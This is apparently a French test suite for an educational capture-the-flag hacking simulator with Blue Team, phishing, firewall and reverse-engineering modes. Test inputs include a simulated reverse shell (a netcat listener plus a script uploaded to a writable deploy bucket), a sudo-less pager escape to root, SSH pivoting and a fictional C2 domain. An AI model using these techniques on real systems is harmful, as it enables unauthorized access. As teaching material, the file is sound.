  const ro = run(ctx, "cloudctl cp x.sh s3://tempest-artifacts/");
  assert(ro.cls === "t-err" && /AccessDenied/.test(ro.text), "un bucket non-inscriptible refuse cloudctl cp");

  // Le bucket de déploiement est inscriptible, mais rien sans écoute préalable.
  const noListen = run(ctx, "cloudctl cp reverse.sh s3://tempest-deploy/");
  assert(noListen.cls === "t-err" && /nc -lvnp/.test(noListen.text), "cp sur le bucket deploy sans écoute -> pas d'accès");
  assertEqual(get(ctx, "GAME.progress.tempest.access"), false, "aucun accès tant qu'on n'écoute pas");

  // En écoute, le pipeline exécute l'objet et rappelle -> accès.
  run(ctx, "nc -lvnp 4444");
  const shell = run(ctx, "cloudctl cp reverse.sh s3://tempest-deploy/");
  assert(shell.cls !== "t-err" && /pipeline de déploiement/.test(shell.text), "cp + écoute -> le pipeline exécute et rappelle");
  assertEqual(get(ctx, "GAME.progress.tempest.access"), true, "accès ci obtenu via le bucket inscriptible");
  assertEqual(get(ctx, "SESSION.user"), "ci", "la reverse shell atterrit en tant que ci");
  assert(/FLAG\{tempest_acces_initial/.test(run(ctx, "cat user.txt").text), "flag utilisateur TEMPEST lisible");
});

// ── 15. Parser shell : variables, substitution, redirections ─────────────────
section("Parser shell : $VAR, $(...), redirections", () => {
  const ctx = freshContext();
  unlockAll(ctx);

  // Variables intégrées
  assertEqual(run(ctx, "echo $USER").text, "kali", "$USER développé");
  assertEqual(run(ctx, "echo $HOME/x").text, "/home/kali/x", "$VAR concaténé à du texte");
  assertEqual(run(ctx, "echo ${USER}_end").text, "kali_end", "${VAR} développé");
  assertEqual(run(ctx, "echo $INCONNU-fin").text, "-fin", "variable inconnue -> chaîne vide");

  // Guillemets : simples littéraux, doubles expansés
  assertEqual(run(ctx, "echo '$USER'").text, "$USER", "guillemets simples : pas d'expansion");
  assertEqual(run(ctx, 'echo "salut $USER"').text, "salut kali", "guillemets doubles : expansion");

  // $? reflète le code de sortie précédent
  run(ctx, "commande_qui_nexiste_pas");
  assertEqual(run(ctx, "echo $?").text, "1", "$? = 1 après une erreur");
  run(ctx, "echo ok");
  assertEqual(run(ctx, "echo $?").text, "0", "$? = 0 après un succès");

  // Substitution de commande $(...)
  assertEqual(run(ctx, "echo [$(whoami)]").text, "[kali]", "substitution $(whoami)");
  assertEqual(run(ctx, "echo $(echo imbrique)").text, "imbrique", "substitution imbriquée");

  // Redirection stderr : 2>/dev/null supprime la sortie d'erreur
  const suppressed = run(ctx, "nmap 9.9.9.9 2>/dev/null");
  assertEqual(suppressed.text, "", "2>/dev/null supprime le message d'erreur");
  assert(suppressed.cls !== "t-err", "2>/dev/null neutralise aussi la classe d'erreur");
  // &>/dev/null supprime tout
  assertEqual(run(ctx, "echo visible &>/dev/null").text, "", "&>/dev/null supprime toute la sortie");

  // Un $ dans un pipe (awk) ne doit pas être confondu avec une variable shell
  assertEqual(run(ctx, "echo 'a b c' | awk '{print $2}'").text, "b", "$2 d'awk préservé dans un pipe");

  // Substitution utilisée comme argument d'une vraie commande
  run(ctx, "use nimbus"); run(ctx, "nmap 10.10.11.21"); run(ctx, "ftp 10.10.11.21");
  run(ctx, "ssh jsmith@10.10.11.21"); pass(ctx, "N1mbus_B4ckup!2024");
  assert(/FLAG\{nimbus_acces_initial/.test(run(ctx, "cat $(echo user.txt)").text), "cat $(echo user.txt) lit bien le flag");
});

// ── 16. Éditeur de machines : loadCustomMachine (JSON déclaratif) ────────────
section("Éditeur de machines : loadCustomMachine", () => {
  const ctx = freshContext();
  const before = get(ctx, "MACHINES.length");

  const tpl = {
    id: "sandbox", name: "SANDBOX", ip: "10.99.0.1", difficulty: "Facile",
    os: "Linux (Debian 12)", briefing: "Machine de démonstration créée dans l'éditeur.",
    ports: [{ port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.2p1" }],
    web: {}, ftp: { enabled: false },
    sshUsers: { guest: { password: "guest123" } },
    targetFS: {
      hostname: "sandbox", homeDir: "/home/guest",
      users: { guest: { home: "/home/guest", fs: {
        "user.txt": { type: "file", content: "FLAG{sandbox_user}", perms: "-rw-r-----", owner: "guest" },
      } } },
      extraFS: {}, sudoL: "guest peut : (root) NOPASSWD: /usr/bin/less",
    },
    // regex écrite comme une chaîne (clé finissant par "Regex") -> compilée au chargement
    privesc: {
      type: "sudo-gtfobins",
      exploitCmdRegex: "^sudo\\s+(/usr/bin/)?less\\s+/etc/hostname$",
      pagerEscapeRegex: "^!/?(bin/)?sh$|^!bash$",
      enterMsg: "(pager root ouvert — tape !sh)",
    },
    rootFile: { path: "/root/root.txt", content: "FLAG{sandbox_root}" },
    hints: { recon: ["scanne le port"], access: ["ssh guest"], privesc: ["sudo less puis !sh"] },
  };
  const json = JSON.stringify(tpl);

  // JSON invalide -> erreur
  const bad = get(ctx, `loadCustomMachine('{ pas du json')`);
  assert(!bad.ok && /JSON invalide/.test(bad.errors[0]), "un JSON invalide est refusé");

  // Schéma incomplet -> erreurs de validateMachines
  const incomplete = get(ctx, `loadCustomMachine(${JSON.stringify(JSON.stringify({ id: "x", name: "X" }))})`);
  assert(!incomplete.ok && incomplete.errors.length > 0, "une machine incomplète est refusée avec des erreurs de schéma");

  // Collision d'id avec une machine existante -> erreur
  const collide = get(ctx, `loadCustomMachine(${JSON.stringify(JSON.stringify(Object.assign({}, tpl, { id: "nimbus" })))})`);
  assert(!collide.ok && /id déjà utilisé/.test(collide.errors.join(" ")), "un id déjà pris est refusé");

  // Chargement valide -> injectée, déverrouillée, regex compilée
  const res = get(ctx, `loadCustomMachine(${JSON.stringify(json)})`);
  assert(res.ok, "une machine valide est acceptée (" + JSON.stringify(res.errors) + ")");
  assertEqual(get(ctx, "MACHINES.length"), before + 1, "la machine custom est ajoutée à MACHINES");
  assert(get(ctx, `Object.prototype.toString.call(MACHINES.find(m=>m.id==='sandbox').privesc.exploitCmdRegex)`) === "[object RegExp]", "la regex string a bien été compilée en RegExp");
  assert(get(ctx, "GAME.unlocked.includes('sandbox')"), "la machine custom est déverrouillée");

  // ...et pleinement jouable dans le vrai moteur
  run(ctx, "use sandbox");
  run(ctx, "nmap 10.99.0.1");
  run(ctx, "ssh guest@10.99.0.1"); pass(ctx, "guest123");
  assert(/FLAG\{sandbox_user\}/.test(run(ctx, "cat user.txt").text), "flag user de la machine custom lisible");
  run(ctx, "sudo less /etc/hostname");
  run(ctx, "!sh");
  assert(/FLAG\{sandbox_root\}/.test(run(ctx, "cat /root/root.txt").text), "flag root de la machine custom capturé");
  const p = get(ctx, "GAME.progress.sandbox");
  assert(p.recon && p.access && p.privesc && p.userFlag && p.rootFlag, "les 5 jalons de la machine custom sont validés");

  // La machine custom n'empêche pas le badge "tour complet" (exclue du décompte)
  assert(get(ctx, "MACHINES.some(m=>m.custom)"), "la machine custom est bien marquée custom");
});

// ── 17. Partage de scénario par URL : encode/decode + chargement ─────────────
section("Partage par URL : encodeScenario / decodeScenario", () => {
  const ctx = freshContext();

  // Round-trip sur du texte avec accents et caractères spéciaux (UTF-8)
  const sample = 'Contrôle d\'accès "élevé" — €, \\ et / inclus';
  const rt = get(ctx, `decodeScenario(encodeScenario(${JSON.stringify(sample)}))`);
  assertEqual(rt, sample, "round-trip encode/decode préserve un texte UTF-8");

  // base64url : pas de +, /, ni = dans la sortie
  const enc = get(ctx, `encodeScenario(${JSON.stringify(sample)})`);
  assert(/^[A-Za-z0-9_-]+$/.test(enc), "l'encodage est bien en base64url (URL-safe)");

  // Une machine encodée -> décodée -> chargée -> jouable
  const tpl = {
    id: "shared1", name: "SHARED1", ip: "10.99.0.9", difficulty: "Facile",
    os: "Linux", briefing: "Machine partagée par lien.",
    ports: [{ port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.2p1" }],
    web: {}, ftp: { enabled: false },
    sshUsers: { guest: { password: "pw" } },
    targetFS: {
      hostname: "shared1", homeDir: "/home/guest",
      users: { guest: { home: "/home/guest", fs: {
        "user.txt": { type: "file", content: "FLAG{shared1_user}", perms: "-rw-r-----", owner: "guest" },
      } } },
      extraFS: {}, sudoL: "(root) NOPASSWD: /usr/bin/less",
    },
    privesc: {
      type: "sudo-gtfobins",
      exploitCmdRegex: "^sudo\\s+(/usr/bin/)?less\\s+/etc/hostname$",
      pagerEscapeRegex: "^!/?(bin/)?sh$|^!bash$",
      enterMsg: "(pager root)",
    },
    rootFile: { path: "/root/root.txt", content: "FLAG{shared1_root}" },
    hints: { recon: ["nmap"], access: ["ssh"], privesc: ["less puis !sh"] },
  };
  const json = JSON.stringify(tpl);
  const token = get(ctx, `encodeScenario(${JSON.stringify(json)})`);
  const decoded = get(ctx, `decodeScenario(${JSON.stringify(token)})`);
  const res = get(ctx, `loadCustomMachine(${JSON.stringify(decoded)})`);
  assert(res.ok, "la machine décodée depuis le lien se charge (" + JSON.stringify(res.errors) + ")");

  run(ctx, "use shared1"); run(ctx, "nmap 10.99.0.9");
  run(ctx, "ssh guest@10.99.0.9"); pass(ctx, "pw");
  run(ctx, "sudo less /etc/hostname"); run(ctx, "!sh");
  assert(/FLAG\{shared1_root\}/.test(run(ctx, "cat /root/root.txt").text), "la machine partagée est jouable jusqu'au flag root");

  // Un token corrompu ne fait pas planter le décodage en JSON valide
  const corrupt = get(ctx, `(function(){ try { JSON.parse(decodeScenario("!!!pas-du-base64!!!")); return "parsed"; } catch(e){ return "threw"; } })()`);
  assertEqual(corrupt, "threw", "un token corrompu ne produit pas un JSON valide (erreur gérée en amont)");
});

// ── 18. Générateur procédural de machines ────────────────────────────────────
section("Générateur procédural : machines valides et jouables", () => {
  // Déterminisme : même seed -> même machine
  const c1 = freshContext();
  const g1 = get(c1, `generateMachine("graine-42")`);
  const g2 = get(c1, `generateMachine("graine-42")`);
  assertEqual(g1.machine.id, g2.machine.id, "même seed -> même id");
  assertEqual(g1.machine.ip, g2.machine.ip, "même seed -> même ip");
  assertEqual(g1.machine.rootFile.content, g2.machine.rootFile.content, "même seed -> même flag root");
  const g3 = get(c1, `generateMachine("autre-graine")`);
  assert(g3.machine.id !== g1.machine.id, "un seed différent produit une machine différente");

  // Plusieurs seeds : schéma valide + exploitation complète via le walkthrough généré
  const seeds = ["alpha", "bravo", "charlie", "delta-9", "1234"];
  for (const seed of seeds) {
    const ctx = freshContext();
    const gen = get(ctx, `generateMachine(${JSON.stringify(seed)})`);
    const errs = get(ctx, `validateMachines([compileRegexesDeep(generateMachine(${JSON.stringify(seed)}).machine)])`);
    assertEqual(errs.length, 0, `seed ${seed} : machine conforme au schéma (${JSON.stringify(errs)})`);

    const res = get(ctx, `loadCustomMachine(generateMachine(${JSON.stringify(seed)}).machine)`);
    assert(res.ok, `seed ${seed} : machine chargée (${JSON.stringify(res.errors)})`);

    run(ctx, "use " + gen.machine.id);
    for (const step of gen.walkthrough) {
      if (step && typeof step === "object" && step.pw) pass(ctx, gen.password);
      else run(ctx, step);
    }
    const p = get(ctx, `GAME.progress[${JSON.stringify(gen.machine.id)}]`);
    assert(p.recon && p.access && p.privesc && p.userFlag && p.rootFlag,
      `seed ${seed} : machine générée entièrement jouable (recon->privesc->2 flags)`);
  }

  // La commande `generate <seed>` charge et rend jouable
  const ctx = freshContext();
  const out = run(ctx, "generate maquette");
  assert(out.cls !== "t-err" && /Machine générée/.test(out.text), "`generate <seed>` génère et charge une machine");
  const gen = get(ctx, `generateMachine("maquette")`);
  assert(get(ctx, `GAME.unlocked.includes(${JSON.stringify(gen.machine.id)})`), "la machine générée par la commande est déverrouillée");
});

// ── 19. Bac à sable libre : FS custom, sans flag ni scoring ──────────────────
section("Bac à sable libre : FS custom, sans flag ni score", () => {
  const ctx = freshContext();
  const scoreBefore = get(ctx, "GAME.score");

  const m = run(ctx, "sandbox");
  assert(m.cls !== "t-err" && /Bac à sable monté/.test(m.text), "`sandbox` monte le FS de démo");
  assertEqual(get(ctx, "SESSION.sandbox"), true, "le mode sandbox est actif");
  assertEqual(get(ctx, "SESSION.user"), "hacker", "on est `hacker` dans le bac à sable");

  const ls = run(ctx, "ls");
  assert(/README\.txt/.test(ls.text) && /notes/.test(ls.text), "ls liste le FS de démo");
  assert(/entraîne-toi/.test(run(ctx, "cat README.txt").text), "cat lit un fichier du sandbox");

  run(ctx, "cd notes");
  assert(/todo\.txt/.test(run(ctx, "ls").text), "cd + ls dans un sous-dossier custom");
  run(ctx, "cd ..");

  assertEqual(run(ctx, "cat data/users.csv | cut -d , -f 2 | sort | head -1").text, "alice", "pipe cut/sort/head sur un fichier custom");
  assert(/POST/.test(run(ctx, "cat logs/access.log | grep POST").text), "grep (en pipe) filtre les lignes d'un fichier custom");

  // Aucun scoring, aucune capture de flag dans le bac à sable
  run(ctx, "echo FLAG{ceci_nest_pas_capture}");
  assertEqual(get(ctx, "GAME.score"), scoreBefore, "le bac à sable ne modifie jamais le score");

  run(ctx, "exit");
  assertEqual(get(ctx, "SESSION.sandbox"), false, "`exit` quitte le bac à sable");
  assertEqual(get(ctx, "SESSION.user"), "kali", "retour sur kali après avoir quitté");

  // Montage d'un FS entièrement personnalisé (API utilisée par l'UI)
  get(ctx, `mountSandbox({ "a/b/c.txt": "coucou", "vide/": {}, "/etc/motd": "bienvenue" })`);
  assertEqual(get(ctx, "SESSION.sandbox"), true, "mountSandbox réactive le mode sandbox");
  assert(/coucou/.test(run(ctx, "cat a/b/c.txt").text), "FS custom : fichier imbriqué monté et lisible");
  assert(/bienvenue/.test(run(ctx, "cat /etc/motd").text), "FS custom : chemin absolu monté");
  assert(run(ctx, "cd vide").cls !== "t-err", "FS custom : dossier vide navigable");
});

// ── 20. Mode Blue Team : analyse de logs (SOC) ───────────────────────────────
section("Mode Blue Team : analyse de logs", () => {
  const ctx = freshContext();
  const incidents = get(ctx, "BLUE_INCIDENTS");
  assert(incidents.length >= 3, `au moins 3 incidents Blue Team (trouvé ${incidents.length})`);

  assert(/Blue Team/.test(run(ctx, "blueteam").text), "`blueteam` liste les incidents");
  const show = run(ctx, `incident ${incidents[0].id}`);
  assert(/LOGS/.test(show.text) && /Failed password|GET |POST /.test(show.text), "`incident` affiche le scénario + les logs");

  // Mauvaise réponse rejetée, indice disponible
  const wrong = run(ctx, `answer ${incidents[0].id} ${incidents[0].questions[0].id} 1.2.3.4`);
  assert(wrong.cls === "t-err", "une mauvaise réponse est rejetée");
  assert(run(ctx, `bthint ${incidents[0].id} ${incidents[0].questions[0].id}`).cls === "t-hint", "`bthint` donne un indice");

  // Résolution complète de chaque incident (réponses en MAJUSCULES -> teste la normalisation)
  let expected = get(ctx, "GAME.score");
  for (const inc of incidents) {
    for (const q of inc.questions) {
      run(ctx, `answer ${inc.id} ${q.id} ${String(q.accept[0]).toUpperCase()}`);
    }
    expected += inc.points;
    assert(get(ctx, `GAME.blueteam.solved[${JSON.stringify(inc.id)}]`), `${inc.id} : résolu après toutes les bonnes réponses`);
  }
  assertEqual(get(ctx, "GAME.score"), expected, "le score gagne les points de chaque incident résolu");
  assertEqual(get(ctx, "GAME.badges.blueteam_complete"), true, "badge Analyste SOC débloqué après tous les incidents");

  // Pas de double crédit
  const scoreNow = get(ctx, "GAME.score");
  run(ctx, `answer ${incidents[0].id} ${incidents[0].questions[0].id} ${incidents[0].questions[0].accept[0]}`);
  assertEqual(get(ctx, "GAME.score"), scoreNow, "un incident déjà résolu ne recrédite pas de points");
});

// ── 21. Pare-feu simulé (iptables-like) ──────────────────────────────────────
section("Pare-feu simulé : iptables (lecture/écriture de règles)", () => {
  const ctx = freshContext();
  assert(/Pare-feu/.test(run(ctx, "firewall").text), "`firewall` liste les scénarios");
  assert(run(ctx, "iptables -L").cls === "t-err", "iptables hors scénario -> erreur");

  const scoreBefore = get(ctx, "GAME.score");

  // Scénario 1 : durcissement
  run(ctx, "firewall fw-harden");
  run(ctx, "iptables -P INPUT DROP");
  run(ctx, "iptables -A INPUT -p tcp --dport 80 -j ACCEPT");
  run(ctx, "iptables -A INPUT -p tcp --dport 443 -j ACCEPT");
  run(ctx, "iptables -A INPUT -s 10.0.0.0/8 -p tcp --dport 22 -j ACCEPT");
  assert(get(ctx, "GAME.firewall.solved['fw-harden']"), "fw-harden résolu (web ouvert, SSH LAN-only, reste fermé)");

  // Scénario 2 : la leçon de l'ordre des règles
  run(ctx, "firewall fw-block");
  run(ctx, "iptables -A INPUT -s 203.0.113.66 -j DROP");
  assert(!get(ctx, "GAME.firewall.solved['fw-block']"), "un DROP ajouté APRÈS la règle accept:80 ne bloque pas l'attaquant (1re correspondance gagne)");
  run(ctx, "firewall reset");
  run(ctx, "iptables -I INPUT 1 -s 203.0.113.66 -j DROP");
  assert(get(ctx, "GAME.firewall.solved['fw-block']"), "insérer le DROP en tête bloque l'attaquant sans couper le web");

  assertEqual(get(ctx, "GAME.score"), scoreBefore + 400, "les deux scénarios créditent leurs points");
  assertEqual(get(ctx, "GAME.badges.firewall_complete"), true, "badge Ingénieur réseau débloqué");

  // Pas de double crédit
  const now = get(ctx, "GAME.score");
  run(ctx, "iptables -A INPUT -p tcp --dport 8080 -j ACCEPT");
  assertEqual(get(ctx, "GAME.score"), now, "un scénario déjà résolu ne recrédite pas");

  // firewall exit
  run(ctx, "firewall exit");
  assertEqual(get(ctx, "SESSION.firewall"), null, "`firewall exit` quitte le mode pare-feu");
});

// ── 22. Chapitre phishing : analyse d'une boîte mail ─────────────────────────
section("Chapitre phishing : analyse de mails", () => {
  const ctx = freshContext();
  assert(/phishing/i.test(run(ctx, "phishing").text), "`phishing` liste les mails");
  const show = run(ctx, "mail mail-it");
  assert(/Reply-To|Received-SPF/.test(show.text) && /verify-account\.ru/.test(show.text), "`mail` affiche en-têtes + lien suspect");

  // Mauvais verdict rejeté ; indice dispo
  assert(run(ctx, "report mail-it verdict legitime").cls === "t-err", "classer un phishing comme légitime est rejeté");
  assert(run(ctx, "phhint mail-it verdict").cls === "t-hint", "`phhint` donne un indice");

  const scoreBefore = get(ctx, "GAME.score");

  // Mail légitime : un seul verdict suffit
  run(ctx, "report mail-news verdict legitime");
  assert(get(ctx, "GAME.phishing.solved['mail-news']"), "un mail légitime bien classé est traité");

  // Phishing : verdict + indicateur (formulé librement -> matching 'contains')
  run(ctx, "report mail-it verdict phishing");
  assert(!get(ctx, "GAME.phishing.solved['mail-it']"), "le verdict seul ne suffit pas pour un phishing (il faut l'indicateur)");
  run(ctx, "report mail-it indice le domaine du lien est en .ru et usurpe la marque");
  assert(get(ctx, "GAME.phishing.solved['mail-it']"), "verdict + indicateur (texte libre) résolvent le phishing");

  run(ctx, "report mail-invoice verdict phishing");
  run(ctx, "report mail-invoice indice piece jointe .exe (double extension)");
  assert(get(ctx, "GAME.phishing.solved['mail-invoice']"), "le mail avec pièce jointe .exe est traité");

  assertEqual(get(ctx, "GAME.score"), scoreBefore + 400, "les 3 mails créditent leurs points (100+150+150)");
  assertEqual(get(ctx, "GAME.badges.phishing_complete"), true, "badge Anti-hameçonnage débloqué");

  const now = get(ctx, "GAME.score");
  run(ctx, "report mail-news verdict legitime");
  assertEqual(get(ctx, "GAME.score"), now, "un mail déjà traité ne recrédite pas");
});

// ── 23. Sous-réseau simulé multi-hôtes (via pivot) ───────────────────────────
section("Sous-réseau simulé : nmap <cidr> + arp via pivot", () => {
  const ctx = freshContext();
  unlockAll(ctx);

  // Sans pivot, le segment interne n'est pas balayable
  assert(run(ctx, "nmap 172.16.20.0/24").cls === "t-err", "nmap d'un /24 interne échoue sans pivot");
  assert(/vide/.test(run(ctx, "arp -a").text), "arp -a est vide sans segment joignable");

  // On roote le pivot (NEXUS) puis on ouvre le tunnel
  run(ctx, "use nexus");
  MACHINE_SOLUTIONS.nexus(ctx);
  run(ctx, "ssh -L 9022:172.16.20.10:22 root@10.10.11.135");

  // Le balayage /24 révèle plusieurs hôtes
  const scan = run(ctx, "nmap 172.16.20.0/24");
  assert(scan.cls !== "t-err" && /172\.16\.20\.10/.test(scan.text) && /172\.16\.20\.20/.test(scan.text) && /nas-backup/.test(scan.text), "nmap /24 révèle plusieurs hôtes internes");

  // arp -a montre la table du segment
  const arp = run(ctx, "arp -a");
  assert(/172\.16\.20\.10/.test(arp.text) && /ether/.test(arp.text), "arp -a liste la table ARP du segment interne");

  // Un hôte leurre répond au scan mais reste une piste morte
  const decoy = run(ctx, "nmap 172.16.20.20");
  assert(decoy.cls !== "t-err" && /nas-backup|445/.test(decoy.text) && /piste morte/.test(decoy.text), "un hôte leurre répond au scan (piste morte)");

  // L'hôte exploitable réel (CITADEL) reste scannable normalement
  assert(/citadel/i.test(run(ctx, "nmap 172.16.20.10").text), "l'hôte exploitable du segment (CITADEL) répond au scan ciblé");
});

// ── 24. Mini reverse engineering : strings + désassembleur simulé ────────────
section("Reverse engineering : strings / disas / resolve", () => {
  const ctx = freshContext();
  assert(/reverse/i.test(run(ctx, "malware").text), "`malware` liste les échantillons");
  assert(/deliv-cdn\.ru/.test(run(ctx, "strings dropper").text), "`strings` révèle les chaînes en dur (dont le C2)");
  const d = run(ctx, "disas dropper");
  assert(/xor|connect/i.test(d.text), "`disas` montre le pseudo-désassemblage");

  // Mauvaise réponse rejetée ; indice
  assert(run(ctx, "resolve dropper c2 exemple.com").cls === "t-err", "un mauvais C2 est rejeté");
  assert(run(ctx, "rehint dropper c2").cls === "t-hint", "`rehint` donne un indice");

  const scoreBefore = get(ctx, "GAME.score");

  // dropper : 3 questions (dont matching 'contains' et hexa)
  run(ctx, "resolve dropper c2 le domaine est deliv-cdn.ru");
  run(ctx, "resolve dropper xorkey 0x37");
  assert(!get(ctx, "GAME.reverse.solved['dropper']"), "il faut répondre à toutes les questions");
  run(ctx, "resolve dropper nature backdoor c2");
  assert(get(ctx, "GAME.reverse.solved['dropper']"), "dropper analysé après les 3 réponses");

  // authcheck : clé en dur + faille
  run(ctx, "resolve authcheck key R3v3rs3_M3_2026!");
  run(ctx, "resolve authcheck faille clé comparée en dur (strcmp)");
  assert(get(ctx, "GAME.reverse.solved['authcheck']"), "authcheck résolu (clé + faille)");

  assertEqual(get(ctx, "GAME.score"), scoreBefore + 350, "les 2 échantillons créditent leurs points (200+150)");
  assertEqual(get(ctx, "GAME.badges.reverse_complete"), true, "badge Reverse engineer débloqué");

  const now = get(ctx, "GAME.score");
  run(ctx, "resolve dropper c2 deliv-cdn.ru");
  assertEqual(get(ctx, "GAME.score"), now, "un échantillon déjà résolu ne recrédite pas");
});

// ── 25. Attack graph : génération SVG selon la progression ───────────────────
section("Attack graph : rendu SVG du chemin d'attaque", () => {
  const ctx = freshContext();
  // Progression partielle : recon + accès + flag user, mais pas privesc/root
  const partial = get(ctx, `buildAttackGraphSVG(MACHINES.find(m=>m.id==='nimbus'), {recon:true,access:true,privesc:false,userFlag:true,rootFlag:false})`);
  assert(/<svg[\s\S]*<\/svg>/.test(partial), "produit bien un élément SVG complet");
  assert(/Recon/.test(partial) && /Accès initial/.test(partial) && /Privesc/.test(partial) && /Flag root/.test(partial), "les 5 étapes sont présentes comme nœuds");
  assertEqual((partial.match(/class="ag-node on"/g) || []).length, 3, "3 nœuds atteints (recon, accès, flag user) portent la classe .on");

  // Aucune progression : aucun nœud allumé
  const none = get(ctx, `buildAttackGraphSVG(MACHINES.find(m=>m.id==='nimbus'), {recon:false,access:false,privesc:false,userFlag:false,rootFlag:false})`);
  assertEqual((none.match(/class="ag-node on"/g) || []).length, 0, "sans progression, aucun nœud n'est allumé");

  // Machine complète : les 5 nœuds allumés + label de privesc pertinent
  const full = get(ctx, `buildAttackGraphSVG(MACHINES.find(m=>m.id==='axiom'), {recon:true,access:true,privesc:true,userFlag:true,rootFlag:true})`);
  assertEqual((full.match(/class="ag-node on"/g) || []).length, 5, "machine terminée -> 5 nœuds allumés");
  assert(/groupe docker/.test(full), "le label de privesc reflète la technique de la machine (docker pour AXIOM)");
});

// ── 26. Visualiseur de pile : défi buffer overflow simulé ────────────────────
section("Buffer overflow simulé : stackEval / attemptStack / SVG", () => {
  const ctx = freshContext();

  // Payload court : tient dans le buffer, pas de débordement
  assertEqual(get(ctx, "stackEval(8, '').status"), "safe", "8 octets < 16 -> pas de débordement");
  // Déborde dans le RBP sauvé mais pas jusqu'à RET
  assertEqual(get(ctx, "stackEval(20, '').status"), "rbp", "20 octets écrasent le RBP mais pas encore RET");
  // Adresse trop tôt (offset < 24)
  assertEqual(get(ctx, "stackEval(16, '0x401156').status"), "early", "adresse à l'offset 16 -> trop tôt");
  // Bon offset mais mauvaise adresse
  assertEqual(get(ctx, "stackEval(24, '0x400000').status"), "ret-wrong", "offset 24 mais mauvaise adresse -> ret-wrong");
  // Bon offset + bonne adresse -> victoire (accepte aussi sans le 0x)
  assert(get(ctx, "stackEval(24, '401156').win"), "offset 24 + adresse de win (sans 0x) -> victoire");

  // Scoring : attemptStack crédite une fois
  const before = get(ctx, "GAME.score");
  const r = get(ctx, "attemptStack(24, '0x401156')");
  assert(r.win, "attemptStack signale la victoire");
  assertEqual(get(ctx, "GAME.stackpwn.solved"), true, "le défi est marqué résolu");
  assertEqual(get(ctx, "GAME.score"), before + 200, "la victoire crédite 200 pts");
  assertEqual(get(ctx, "GAME.badges.stackpwn_complete"), true, "badge Exploiteur (pédagogique) débloqué");
  get(ctx, "attemptStack(24, '0x401156')");
  assertEqual(get(ctx, "GAME.score"), before + 200, "rejouer ne recrédite pas les points");

  // SVG : structure + classe hijack sur RET à la victoire
  const svg = get(ctx, "buildStackSVG(24, '0x401156')");
  assert(/<svg[\s\S]*<\/svg>/.test(svg) && /char buf\[16\]/.test(svg) && /adresse de retour/.test(svg), "le SVG contient les 3 zones de la pile");
  assert(/sk-slot hijack/.test(svg), "à la victoire, la zone RET porte la classe hijack");
  const svg0 = get(ctx, "buildStackSVG(0, '')");
  assert(!/hijack/.test(svg0) && !/sk-slot fill/.test(svg0), "sans payload, aucune zone n'est allumée");
});

// ── 27. Arbre de compétences / rangs (RPG) ───────────────────────────────────
section("Arbre de compétences : skills, rangs, déblocage par palier", () => {
  const ctx = freshContext();
  // Rang selon le niveau (500 XP/niveau)
  assertEqual(get(ctx, "rankTitle(1)"), "Débutant", "niveau 1 -> Débutant");
  assertEqual(get(ctx, "rankTitle(5)"), "Pentester", "niveau 5 -> Pentester");
  assert(/Rang/.test(run(ctx, "skills").text), "`skills` affiche le rang et les compétences");

  // Commande avancée verrouillée au niveau 1, débloquée en montant en XP
  assert(run(ctx, "whois 10.10.11.21").cls === "t-err", "whois verrouillé au niveau 1");
  get(ctx, "GAME.score = 600;"); // niveau 2
  assert(get(ctx, "commandUnlocked('whois')"), "whois débloqué au niveau 2");
  assert(/netname/.test(run(ctx, "whois 10.10.11.21").text), "whois fournit une fiche réseau une fois débloqué");
});

// ── 28. Time-machine du FS : undo / redo ─────────────────────────────────────
section("Time-machine du FS : undo / redo", () => {
  const ctx = freshContext();
  run(ctx, "sandbox");
  const orig = run(ctx, "cat README.txt").text;

  // Rien à annuler au départ
  assert(/Rien à annuler/.test(run(ctx, "undo").text), "undo sans modification n'a rien à annuler");

  // Modification via echo >> (snapshot pris)
  run(ctx, "echo LIGNE_AJOUTEE >> README.txt");
  assert(/LIGNE_AJOUTEE/.test(run(ctx, "cat README.txt").text), "l'ajout est bien écrit");

  // undo -> contenu restauré
  run(ctx, "undo");
  assertEqual(run(ctx, "cat README.txt").text, orig, "undo restaure le contenu d'origine du fichier");

  // redo -> ajout rétabli
  run(ctx, "redo");
  assert(/LIGNE_AJOUTEE/.test(run(ctx, "cat README.txt").text), "redo rétablit la modification");

  // Éditer via vim est aussi annulable
  run(ctx, "vim notes.txt");
  run(ctx, "contenu vim");
  run(ctx, ":wq");
  assert(/contenu vim/.test(run(ctx, "cat notes.txt").text), "vim a écrit le fichier");
  run(ctx, "undo");
  assert(run(ctx, "cat notes.txt").cls === "t-err" || !/contenu vim/.test(run(ctx, "cat notes.txt").text), "undo annule aussi l'écriture via vim");

  // Changer de contexte FS réinitialise l'historique
  run(ctx, "exit");
  assert(/Rien à annuler/.test(run(ctx, "undo").text), "quitter le sandbox réinitialise l'historique du FS");
});

// ── 29. Hot-seat local : profils multiples comparés ──────────────────────────
section("Hot-seat : profils de joueur multiples", () => {
  const ctx = freshContext();
  assertEqual(get(ctx, "HOTSEAT.current"), "joueur1", "profil par défaut = joueur1");
  get(ctx, "GAME.score = 500; persistSave();"); // joueur1 -> 500

  const sw = run(ctx, "profile alice");
  assert(sw.cls !== "t-err" && /alice/.test(sw.text), "on bascule sur un nouveau profil");
  assertEqual(get(ctx, "HOTSEAT.current"), "alice", "profil courant = alice");
  assertEqual(get(ctx, "GAME.score"), 0, "un nouveau profil démarre une partie neuve");
  get(ctx, "GAME.score = 200; persistSave();"); // alice -> 200

  run(ctx, "profile joueur1");
  assertEqual(get(ctx, "GAME.score"), 500, "revenir sur joueur1 restaure sa progression (500)");

  const list = run(ctx, "profiles");
  assert(/alice/.test(list.text) && /joueur1/.test(list.text), "profiles liste les deux joueurs");
  assert(/500/.test(list.text) && /200/.test(list.text), "profiles montre les scores respectifs");
  assert(/➤ joueur1/.test(list.text) || /➤\s+joueur1/.test(list.text), "le profil courant est marqué ➤");
});

// ── Rapport final ─────────────────────────────────────────────────────────────
Promise.all(pendingAsync).then(() => {
  console.log(`\n${"─".repeat(60)}`);
  console.log(`${passed} test(s) passés, ${failed} échoué(s).`);
  if (failed > 0) {
    console.log("\nÉchecs :");
    failures.forEach((f) => console.log(`  - ${f}`));
    process.exit(1);
  } else {
    console.log("✅ Tous les tests passent.");
    process.exit(0);
  }
});
